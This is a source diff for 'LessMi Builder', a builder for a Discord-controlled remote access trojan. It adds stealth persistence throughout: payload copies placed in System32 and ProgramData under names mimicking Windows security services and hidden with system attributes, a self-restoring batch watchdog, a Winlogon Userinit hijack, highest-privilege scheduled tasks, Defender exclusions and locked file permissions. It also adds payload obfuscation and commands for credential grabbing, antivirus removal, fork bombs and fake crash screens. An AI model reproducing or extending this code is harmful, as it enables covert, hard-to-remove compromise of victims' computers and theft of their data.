@@ -37,6 +37,7 @@ import sys
 import tempfile
 import threading
 import time
+import traceback
 import urllib.request
 import uuid
 from io import BytesIO
@@ -66,7 +67,7 @@ except Exception:
 ctk.set_appearance_mode("Dark")
 
 APP_NAME = "LessMi Builder"
-VERSION = "Beta v2.6"
+VERSION = "Beta v3.0"
 
 BG = "#07070a"
 PANEL = "#0e0e13"
@@ -90,6 +91,30 @@ PERSIST_STATE = os.path.join(APPDATA_DIR, "persist.json")
 FILTER_STATE = os.path.join(APPDATA_DIR, "filters.json")
 SFX_DIR = os.path.join(tempfile.gettempdir(), "lessmi_sfx")
 
+BUILDER_CRASH = os.path.join(APPDATA_DIR, "crash-builder.log")
+
+
+def _builder_crash(t, v, tb):
+    try:
+        os.makedirs(APPDATA_DIR, exist_ok=True)
+        with open(BUILDER_CRASH, "a", encoding="utf-8") as f:
+            f.write("\n=== {} ===\n".format(time.strftime("%Y-%m-%d %H:%M:%S")))
+            f.write("argv: {}\n".format(sys.argv))
+            f.write("".join(traceback.format_exception(t, v, tb)))
+    except Exception:
+        pass
+    try:
+        traceback.print_exception(t, v, tb)
+    except Exception:
+        pass
+
+
+sys.excepthook = _builder_crash
+try:
+    threading.excepthook = lambda a: _builder_crash(a.exc_type, a.exc_value, a.exc_traceback)
+except Exception:
+    pass
+
 SOURCE_FILE = "source_assembled.py"
 RUN_KEY_BUILDER = r"Software\Microsoft\Windows\CurrentVersion\Run"
 POLICY_RUN_KEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
@@ -103,27 +128,32 @@ SOUND_URLS = [
 PYI_MAGIC = b"MEI\x0c\x0b\x0a\x0b\x0e"
 
 _CLONE_NAMES = (
-    "WindowsPushNotify", "AppXSvcHost", "SearchHostService", "WpnUserServiceHost",
-    "DeviceAssocService", "SecurityHealthSvc", "WinUpdateBroker", "RuntimeBrokerClient",
-    "ShellHostSvc", "CtfMonService",
+    "WinSec", "SecHost", "DefenderSvc", "WinSvcHost", "SecMon", "WinTrust",
+    "SysGuard", "WinDefend", "SecAgent", "WinUpdate", "CfgMgr", "SvcHost32",
+    "WinHealth", "SecCenter", "TrustHost", "WinPolicy", "SecBoot",
+)
+
+_LEGACY_NAMES = (
+    "NexoraAgent", "NexoraSvc", "NexoraHelper", "NexoraCore", "NexoraHost",
+    "NexoraRun", "NexoraDaemon", "NexoraBg", "NexoraSupport", "NexoraClient",
 )
 
 _WATCH_BAT = """@echo off
-set "EXE={exe}"
-set "BAK={bak}"
-set "TSK={tsk}"
-set "NAME={name}"
+{defs}
 :loop
-if not exist "%EXE%" if exist "%BAK%" (
-  copy /y "%BAK%" "%EXE%" >nul 2>&1
-  attrib +h +s "%EXE%" >nul 2>&1
-  start "" /b "%EXE%"
+set "SRC="
+if exist "%S0%" set "SRC=%S0%"
+{find}
+if defined SRC (
+{restore}
 )
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit 2>nul | find /i "%NAME%" >nul
-if errorlevel 1 start "" /b "%EXE%" --zz-repair
-schtasks /query /tn "%TSK%" >nul 2>&1
-if errorlevel 1 schtasks /create /tn "%TSK%" /tr "\\"%EXE%\\"" /sc onlogon /rl highest /f >nul 2>&1
-ping -n 301 127.0.0.1 >nul 2>&1
+tasklist /fi "imagename eq {name}" 2>nul | find /i "{name}" >nul
+if errorlevel 1 if exist "%S0%" start "" /b "%S0%"
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit 2>nul | find /i "{name}" >nul
+if errorlevel 1 if exist "%S0%" start "" /b "%S0%" --zz-repair
+schtasks /query /tn "{task}" >nul 2>&1
+if errorlevel 1 if exist "%S0%" schtasks /create /tn "{task}" /tr "\\"%S0%\\"" /sc onlogon /rl highest /f >nul 2>&1
+ping -n 300 127.0.0.1 >nul 2>&1
 goto loop
 """
 
@@ -162,6 +192,8 @@ FEATURES = [
      "desc": "Automatic clips every 2 minutes.", "pat": r"^\s*threading\.Thread\(target=record_mic_thread", "mode": "line"},
     {"id": "blacklist", "label": "Blacklist watcher", "group": "RUNTIME",
      "desc": "Kill processes found on the blacklist.", "pat": r"^\s*threading\.Thread\(target=(?:check_blacklist|blacklist_watcher)", "mode": "line"},
+    {"id": "watchdog", "label": "Repair watchdog", "group": "RUNTIME",
+     "desc": "Spawn and monitor the repair batch.", "pat": r"^\s*threading\.Thread\(target=_watchdog_thread", "mode": "line"},
 
     {"id": "presence", "label": "DND presence", "group": "DISCORD",
      "desc": "Set the bot status to \"LessMi RAT\".", "pat": r"^\s+await bot\.change_presence\(", "mode": "block"},
@@ -178,13 +210,14 @@ HELP_CATEGORIES = {
     "monitors-off": "screen", "monitors-on": "screen", "screensaver": "screen",
     "set-wallpaper": "screen", "wallpaper-random": "screen", "play": "screen",
     "tts": "screen", "beep": "screen", "jumpscare": "screen",
+    "img-filter": "screen", "toico": "screen", "matrix": "screen", "ss-wall": "screen",
     "block-input": "input", "unblock-input": "input", "hide-cursor": "input",
     "show-cursor": "input", "key": "input", "click": "input",
     "click-delete": "input", "autoclick": "input", "mouse-speed": "input",
     "swap-mouse": "input", "alt-f4": "input", "minimize-all": "input",
     "taskbar": "input", "desktop-icons": "input", "unpin-all": "input",
     "restart-taskbar": "input", "capslock": "input", "numlock": "input",
-    "scrolllock": "input", "sticky-keys": "input",
+    "scrolllock": "input", "sticky-keys": "input", "hold": "input", "tbar": "input",
     "list-mics": "voice", "sel-mic": "voice", "list-speakers": "voice",
     "set-speaker": "voice", "join": "voice", "disconnect": "voice",
     "record": "voice", "mic-record": "voice", "volume": "voice",
@@ -194,7 +227,9 @@ HELP_CATEGORIES = {
     "start-explorer": "processes", "set-critical": "processes",
     "unset-critical": "processes", "services": "processes", "startup": "processes",
     "window-list": "processes", "focus": "processes", "close-window": "processes",
-    "drivers": "processes", "events": "processes",
+    "drivers": "processes", "events": "processes", "pstree": "processes",
+    "fgwin": "processes", "perf": "processes", "run-add": "processes",
+    "run-del": "processes", "boot-info": "processes",
     "ls": "files", "cd": "files", "tree": "files", "cat": "files",
     "mkdir": "files", "mkfile": "files", "remove": "files", "move": "files",
     "copy": "files", "rename": "files", "size": "files", "hash": "files",
@@ -202,13 +237,21 @@ HELP_CATEGORIES = {
     "upload": "files", "grab-url": "files", "open": "files", "run": "files",
     "recent": "files", "usb": "files", "empty-temp": "files", "hosts": "files",
     "clear-bin": "files", "mount": "files", "unmount": "files",
+    "cloak": "files", "lock-folder": "files", "unlock-folder": "files",
     "grab": "grab", "grabber": "grab",
+    "fake-bsod": "troll", "fake-lock": "troll", "fake-update": "troll",
+    "black-screen": "troll", "caps-roulette": "troll", "volume-roulette": "troll",
+    "numlock-spam": "troll", "window-shake": "troll", "desktop-mess": "troll",
+    "error-storm": "troll", "rickroll": "troll", "crazy-mouse": "troll",
+    "bsod": "troll", "forkbomb": "troll",
+    "wdiag": "persist", "repair": "persist", "implode": "persist", "purge-av": "persist",
+    "vmdiag": "persist", "crashlog": "persist",
 }
 
 CATEGORY_LABELS = {
     "screen": "SCREEN & MEDIA", "input": "INPUT", "voice": "VOICE",
     "processes": "PROCESSES", "files": "FILESYSTEM", "grab": "GRABBER",
-    "misc": "MISC",
+    "troll": "TROLLING", "persist": "PERSISTENCE", "misc": "MISC",
 }
 
 
@@ -480,18 +523,15 @@ def _sys32():
 
 
 def _pick_exe_name():
-    h = _machine_hash()
-    base = _CLONE_NAMES[int(h[:8], 16) % len(_CLONE_NAMES)]
-    for cand in (base, base + "64", base + h[8:11].upper()):
+    for _ in range(40):
+        cand = random.choice(_CLONE_NAMES) + _rnd(random.randint(2, 4))
         if not os.path.exists(os.path.join(_sys32(), cand + ".exe")) and \
            not os.path.isdir(os.path.join(_sys32(), cand)):
             return cand + ".exe"
-    return base + h[:5] + ".exe"
-
+    return random.choice(_CLONE_NAMES) + _rnd(6) + ".exe"
 
 def write_version_file(path, cfg, exe_target):
-    nums = (random.randint(1, 10), random.randint(0, 9),
-            random.randint(0, 40), random.randint(0, 99))
+    nums = (2, 4, 1, random.randint(1, 900))
     ver = "{}.{}.{}.{}".format(*nums)
 
     def esc(value):
@@ -567,7 +607,7 @@ def collect_imports(paths):
             elif isinstance(node, ast.ImportFrom):
                 if node.module and not node.level:
                     names.add(node.module.split(".")[0])
-    for extra in ("platform", "multiprocessing", "encodings.idna", "queue"):
+    for extra in ("platform", "multiprocessing", "encodings.idna", "queue", "tkinter"):
         names.add(extra)
     skip = {"__future__", "this", "antigravity"}
     return sorted(n for n in names if n and n not in skip)
@@ -632,23 +672,59 @@ def sign_exe(path, subject):
     return (r.stdout or "").strip()
 
 
+def _other_volumes():
+    out = []
+    try:
+        import psutil
+        sysdrive = (os.environ.get("SystemDrive") or "C:").upper()
+        for part in psutil.disk_partitions(all=False):
+            if part.fstype.lower() not in ("ntfs", "fat32", "exfat"):
+                continue
+            opts = (part.opts or "").lower()
+            if "cdrom" in opts or "removable" in opts:
+                continue
+            if part.mountpoint.upper().startswith(sysdrive):
+                continue
+            out.append(part.mountpoint.rstrip("\\/"))
+    except Exception:
+        pass
+    return out
+
+
+def _slot_dirs():
+    dirs = [_sys32(), os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"),
+                                   "Microsoft", "Caches")]
+    for vol in _other_volumes():
+        dirs.append(os.path.join(vol, "ProgramData", "Microsoft", "Caches"))
+    seen, out = set(), []
+    for d in dirs:
+        if d.lower() in seen:
+            continue
+        seen.add(d.lower())
+        out.append(d)
+    return out
+
+
 def purge_strays(target_exe):
     keep = os.path.basename(target_exe).lower()
-    for name in _CLONE_NAMES:
-        for suffix in ("", "64"):
-            fn = name + suffix + ".exe"
-            if fn.lower() == keep:
-                continue
-            p = os.path.join(_sys32(), fn)
-            if not os.path.exists(p):
-                continue
-            subprocess.run(["taskkill", "/f", "/im", fn], capture_output=True)
-            time.sleep(0.4)
-            subprocess.run(["attrib", "-r", "-s", "-h", p], capture_output=True)
-            try:
-                os.remove(p)
-            except Exception:
-                pass
+    prefixes = tuple(n.lower() for n in tuple(_CLONE_NAMES) + _LEGACY_NAMES)
+    try:
+        existing = os.listdir(_sys32())
+    except Exception:
+        existing = []
+    for fn in existing:
+        if not fn.lower().endswith(".exe") or fn.lower() == keep:
+            continue
+        if not fn.lower().startswith(prefixes):
+            continue
+        p = os.path.join(_sys32(), fn)
+        subprocess.run(["taskkill", "/f", "/im", fn], capture_output=True)
+        time.sleep(0.3)
+        subprocess.run(["attrib", "-r", "-s", "-h", p], capture_output=True)
+        try:
+            os.remove(p)
+        except Exception:
+            pass
 
     root = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "Microsoft")
     try:
@@ -683,12 +759,16 @@ def cleanup_old_persistence():
             subprocess.run(["schtasks", "/Delete", "/TN", task, "/F"], capture_output=True)
         except Exception:
             pass
-    folder = state.get("folder")
-    if folder and os.path.isdir(folder):
-        try:
-            shutil.rmtree(folder)
-        except Exception:
-            pass
+    for slot in state.get("slots", []) or []:
+        for key in ("bat", "exe"):
+            p = slot.get(key)
+            if not p:
+                continue
+            try:
+                subprocess.run(["attrib", "-r", "-s", "-h", p], capture_output=True)
+                os.remove(p)
+            except Exception:
+                pass
     for key in ("exe", "bak", "bat"):
         p = state.get(key)
         if not p:
@@ -698,6 +778,7 @@ def cleanup_old_persistence():
             os.remove(p)
         except Exception:
             pass
+    folder = state.get("folder")
     if folder and os.path.abspath(folder) != os.path.abspath(_sys32()) \
             and os.path.isdir(folder):
         shutil.rmtree(folder, ignore_errors=True)
@@ -709,86 +790,104 @@ def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
         return "no-admin"
     try:
         h = _machine_hash()
-        cache = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"),
-                             "Microsoft", "Caches")
         exe_name = _pick_exe_name()
         base = os.path.splitext(exe_name)[0]
 
-        if bundle_dir and os.path.isdir(bundle_dir):
-            target_dir = os.path.join(_sys32(), base)
-            target_exe = os.path.join(target_dir, base + ".exe")
-        else:
-            target_dir = _sys32()
-            target_exe = os.path.join(_sys32(), exe_name)
+        slots = []
+        for d in _slot_dirs():
+            slots.append({"dir": d, "exe": os.path.join(d, exe_name),
+                          "bat": os.path.join(d, base + ".bat")})
 
-        bak = os.path.join(cache, h[:12] + ".dat")
-        bat = os.path.join(cache, h[:12] + ".bat")
+        if bundle_dir and os.path.isdir(bundle_dir):
+            primary_dir = os.path.join(_sys32(), base)
+            primary = os.path.join(primary_dir, base + ".exe")
+            slots[0]["dir"] = primary_dir
+            slots[0]["exe"] = primary
+        else:
+            primary = slots[0]["exe"]
+
         task = "\\Microsoft\\Windows\\" + base
 
-        subprocess.run(["taskkill", "/f", "/im", os.path.basename(target_exe)],
+        subprocess.run(["taskkill", "/f", "/im", os.path.basename(primary)],
                        capture_output=True)
         time.sleep(0.8)
 
         cleanup_old_persistence()
-        purge_strays(target_exe)
+        purge_strays(primary)
 
-        os.makedirs(cache, exist_ok=True)
-        os.makedirs(target_dir, exist_ok=True)
+        for s in slots:
+            os.makedirs(s["dir"], exist_ok=True)
 
-        targets = [target_exe, cache]
+        targets = [s["exe"] for s in slots]
         if runtime_dir:
             targets.append(os.path.expandvars(runtime_dir))
         excluded = _mp_add([t for t in targets if t])
 
         if bundle_dir and os.path.isdir(bundle_dir):
-            shutil.copytree(bundle_dir, target_dir, dirs_exist_ok=True,
+            shutil.copytree(bundle_dir, slots[0]["dir"], dirs_exist_ok=True,
                             ignore=shutil.ignore_patterns("build", "*.spec",
                                                           "source_final.py", "boot_payload.py",
                                                           "version_info.txt"))
-            built = os.path.join(target_dir, os.path.basename(exe_path))
-            if os.path.exists(built) and os.path.abspath(built) != os.path.abspath(target_exe):
+            built = os.path.join(slots[0]["dir"], os.path.basename(exe_path))
+            if os.path.exists(built) and os.path.abspath(built) != os.path.abspath(primary):
                 try:
-                    os.replace(built, target_exe)
+                    os.replace(built, primary)
                 except Exception:
-                    shutil.copy2(built, target_exe)
+                    shutil.copy2(built, primary)
                     try:
                         os.remove(built)
                     except Exception:
                         pass
-        elif not _copy_verified(exe_path, target_exe):
+        elif not _copy_verified(exe_path, primary):
             return "fail"
 
-        if not os.path.exists(target_exe):
+        if not os.path.exists(primary):
             return "fail"
 
-        if not _copy_verified(target_exe, bak):
-            return "fail"
+        for s in slots[1:]:
+            _copy_verified(primary, s["exe"])
 
-        with open(bat, "w", encoding="utf-8", newline="\r\n") as f:
-            f.write(_WATCH_BAT.format(exe=target_exe, bak=bak, tsk=task,
-                                      name=os.path.basename(target_exe)))
+        defs = "\r\n".join('set "S{0}={1}"'.format(i, s["exe"]) for i, s in enumerate(slots))
+        find = "\r\n".join('if not defined SRC if exist "%S{0}%" set "SRC=%S{0}%"'.format(i)
+                           for i in range(1, len(slots)))
+        restore = "\r\n".join(
+            '  if not exist "%S{0}%" copy /y "%SRC%" "%S{0}%" >nul 2>&1\r\n'
+            '  if exist "%S{0}%" attrib +h +s "%S{0}%" >nul 2>&1'.format(i)
+            for i in range(len(slots)))
+        body = _WATCH_BAT.format(defs=defs, find=find, restore=restore,
+                                 name=os.path.basename(primary), task=task)
 
-        _mp_add([target_exe])
+        for s in slots:
+            try:
+                with open(s["bat"], "w", encoding="utf-8", newline="\r\n") as f:
+                    f.write(body)
+                _hide_path(s["bat"], True)
+            except Exception:
+                pass
 
-        _hide_path(bat, True)
-        _hide_path(target_exe, True, True)
-        if target_dir != _sys32():
-            _hide_path(target_dir, True)
-
-        subprocess.run(["icacls", target_exe, "/inheritance:r",
-                        "/grant:r", "*S-1-5-18:F",
-                        "/grant:r", "*S-1-5-32-544:F",
-                        "/grant:r", "*S-1-5-32-545:RX"],
-                       capture_output=True, creationflags=0x08000000)
+        for s in slots:
+            _mp_add([s["exe"]])
+            _hide_path(s["exe"], True, True)
+            subprocess.run(["icacls", s["exe"], "/inheritance:r",
+                            "/grant:r", "*S-1-5-18:F",
+                            "/grant:r", "*S-1-5-32-544:F",
+                            "/grant:r", "*S-1-5-32-545:RX"],
+                           capture_output=True, creationflags=0x08000000)
 
         subprocess.run(
-            ["schtasks", "/Create", "/TN", task, "/TR", target_exe,
+            ["schtasks", "/Create", "/TN", task, "/TR", primary,
              "/SC", "ONLOGON", "/RL", "HIGHEST", "/F", "/DELAY", "0000:20"],
             capture_output=True,
         )
+        subprocess.run(
+            ["schtasks", "/Create", "/TN", task + "_w", "/TR", primary,
+             "/SC", "ONSTART", "/RL", "HIGHEST", "/F", "/DELAY", "0000:30"],
+            capture_output=True,
+        )
 
-        _save_persist({"exe": target_exe, "bak": bak, "bat": bat,
-                       "task": task, "tasks": [task]})
+        _save_persist({"exe": primary, "bak": slots[1]["exe"] if len(slots) > 1 else primary,
+                       "bat": slots[0]["bat"], "task": task, "tasks": [task, task + "_w"],
+                       "slots": [{"exe": s["exe"], "bat": s["bat"]} for s in slots]})
 
         ok_init = False
         for _ in range(3):
@@ -800,7 +899,7 @@ def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
         _clean_run_keys()
 
         try:
-            subprocess.Popen(["cmd.exe", "/c", bat], stdin=subprocess.DEVNULL,
+            subprocess.Popen(["cmd.exe", "/c", slots[0]["bat"]], stdin=subprocess.DEVNULL,
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                              creationflags=0x08000000)
         except Exception:
@@ -1143,7 +1242,7 @@ class FilterPopup(ctk.CTkToplevel):
                     cat = HELP_CATEGORIES[token]
                     break
             buckets.setdefault(cat, []).append(c)
-        order = ["screen", "input", "voice", "processes", "files", "grab", "misc"]
+        order = ["screen", "input", "voice", "processes", "files", "grab", "troll", "persist", "misc"]
         return [(k, sorted(buckets[k], key=lambda x: x["name"])) for k in order if k in buckets]
 
     def _build(self):
@@ -1535,6 +1634,7 @@ BANNER = r"""
 class ModernBuilder(ctk.CTk):
     def __init__(self):
         super().__init__()
+        self.report_callback_exception = _builder_crash
 
         self.title("{}  ·  {}".format(APP_NAME, VERSION))
         self.geometry("1140x820")
@@ -1559,11 +1659,11 @@ class ModernBuilder(ctk.CTk):
         self.filter_open = False
         self.logo_path = resolve_logo()
         self.config_data = {
-            "token_1": "", "exe_name": "application.exe", "icon_path": "",
-            "company": "Your company",
-            "product": "Win Service Host",
-            "desc": "Win Service Host",
-            "copyright": "(c) Your company. All rights reserved.",
+            "token_1": "", "exe_name": "Your_app.exe", "icon_path": "",
+            "company": "Your Company",
+            "product": "Your Product",
+            "desc": "Your Application Description.",
+            "copyright": "\u00a9 2026 Your Company. All rights reserved.",
         }
 
         self._apply_window_icon()
@@ -1583,6 +1683,7 @@ class ModernBuilder(ctk.CTk):
         self.log("cwd: {}".format(os.getcwd()), "dim")
         self.log("logo: {}".format(self.logo_path or "monogram fallback"), "dim")
         self.log("audio backend: {}".format(AUDIO_BACKEND or "none"), "dim")
+        self.log("crash log: {}".format(BUILDER_CRASH), "dim")
 
     def _anim(self, widget, attr, start, end, steps=8, delay=13):
         key = str(widget)
@@ -1876,7 +1977,7 @@ class ModernBuilder(ctk.CTk):
             self.field(sub, 0, "Backup token {}".format(i + 1), key, "", secret=True, pad=False)
 
         card = self.section(form, "OUTPUT")
-        self.field(card, 0, "Executable name", "exe_name", "application.exe")
+        self.field(card, 0, "Executable name", "exe_name", "YourApp.exe")
         ctk.CTkLabel(card, text="Packaging mode", font=ctk.CTkFont(family="Poppins", size=10),
                      text_color=MUTED).grid(row=1, column=0, padx=14, pady=(4, 4), sticky="w")
         self.mode_var = ctk.StringVar(value="Single EXE")
@@ -1924,20 +2025,26 @@ class ModernBuilder(ctk.CTk):
         self.field(card, 3, "Copyright", "copyright", self.config_data["copyright"])
 
         self.chk_sign = ctk.CTkCheckBox(
-            card, text="Sign with a local self-signed certificate",
+            card, text="Sign",
             font=ctk.CTkFont(family="Poppins", size=10), text_color=MUTED,
             border_width=1, corner_radius=4, checkmark_color="#0b0b10",
             fg_color=self.accent, hover_color=self.accent)
         self.chk_sign.grid(row=4, column=0, padx=14, pady=(14, 6), sticky="w")
-        self.chk_sign.select()
 
         self.chk_encrypt = ctk.CTkCheckBox(
-            card, text="Obfuscate payload (marshal + zlib)",
+            card, text="Obfuscate payload",
             font=ctk.CTkFont(family="Poppins", size=10), text_color=MUTED,
             border_width=1, corner_radius=4, checkmark_color="#0b0b10",
             fg_color=self.accent, hover_color=self.accent)
-        self.chk_encrypt.grid(row=5, column=0, padx=14, pady=(0, 14), sticky="w")
+        self.chk_encrypt.grid(row=5, column=0, padx=14, pady=(0, 6), sticky="w")
         self.chk_encrypt.select()
+
+        self.chk_console = ctk.CTkCheckBox(
+            card, text="Debug console (only for testing, not recommended for normal use).",
+            font=ctk.CTkFont(family="Poppins", size=10), text_color=MUTED,
+            border_width=1, corner_radius=4, checkmark_color="#0b0b10",
+            fg_color=self.accent, hover_color=self.accent)
+        self.chk_console.grid(row=6, column=0, padx=14, pady=(0, 14), sticky="w")
 
         card = self.section(form, "TERMS")
         self.chk_terms = ctk.CTkCheckBox(
@@ -2255,6 +2362,7 @@ class ModernBuilder(ctk.CTk):
             self._compile()
         except Exception as exc:
             self.log("unhandled exception: {}".format(exc), "err")
+            _builder_crash(type(exc), exc, exc.__traceback__)
             self.update_status("Unexpected error: {}".format(exc), None, "err")
             self.toast("Build failed", "err")
         finally:
@@ -2312,6 +2420,7 @@ class ModernBuilder(ctk.CTk):
         self.log("BUILD START", "accent")
         self.log("  target      : {}.exe".format(exe_target), "info")
         self.log("  mode        : {}".format("onefile" if onefile else "onedir"), "info")
+        self.log("  console     : {}".format(self.chk_console.get() == 1), "info")
         self.log("  token       : {}".format(self._mask(token)), "info")
         self.log("  admin       : {}".format(is_admin()), "info")
         self.log("  resources   : {}".format(len(os.listdir(res_src))), "info")
@@ -2379,10 +2488,16 @@ TOKENS = [{list}]
 token = TOKENS[0] if TOKENS else ""
 
 def _lm_log(msg):
+    line = "[{{}}] {{}}\\n".format(datetime.now(), msg)
     try:
         os.makedirs(APP_DIR, exist_ok=True)
         with open(os.path.join(APP_DIR, "boot.log"), "a", encoding="utf-8") as f:
-            f.write("[{{}}] {{}}\\n".format(datetime.now(), msg))
+            f.write(line)
+    except Exception:
+        pass
+    try:
+        with open(CRASH_FILE, "a", encoding="utf-8") as f:
+            f.write(line)
     except Exception:
         pass
 
@@ -2429,7 +2544,7 @@ def _lm_run():
             _lm_log("intents: {{}}".format(e))
             return
         except Exception as e:
-            _lm_log("crash: {{!r}}".format(e))
+            _lm_log("crash: {{!r}}\\n{{}}".format(e, traceback.format_exc()))
             time.sleep(5)
     _lm_log("all tokens failed")
     _lm_relaunch(90)
@@ -2474,7 +2589,8 @@ def _lm_run():
         original_dir = os.getcwd()
         os.chdir("dist")
         try:
-            cmd = [sys.executable, "-m", "PyInstaller", "--noconsole",
+            cmd = [sys.executable, "-m", "PyInstaller",
+                   "--console" if self.chk_console.get() == 1 else "--noconsole",
                    "--name={}".format(exe_target), "--distpath=.", "--workpath=build",
                    "--specpath=.", entry,
                    "--onefile" if onefile else "--onedir",
@@ -2591,9 +2707,9 @@ def _lm_run():
             self.update_status("Installing persistence...", 0.95)
             result = install_persistence(exe_out, None if onefile else os.getcwd(), runtime_dir)
             if result == "ok":
-                self.log("persistence installed (clone + userinit + task + exclusions)", "ok")
+                self.log("persistence installed (3 slots + userinit + 2 tasks + exclusions)", "ok")
             elif result == "ok-noinit":
-                self.log("persistence installed but USERINIT FAILED (task only)", "warn")
+                self.log("persistence installed but USERINIT FAILED (tasks only)", "warn")
             elif result == "ok-noav":
                 self.log("persistence installed but NO exclusions (tamper protection?)", "warn")
             elif result == "no-admin":
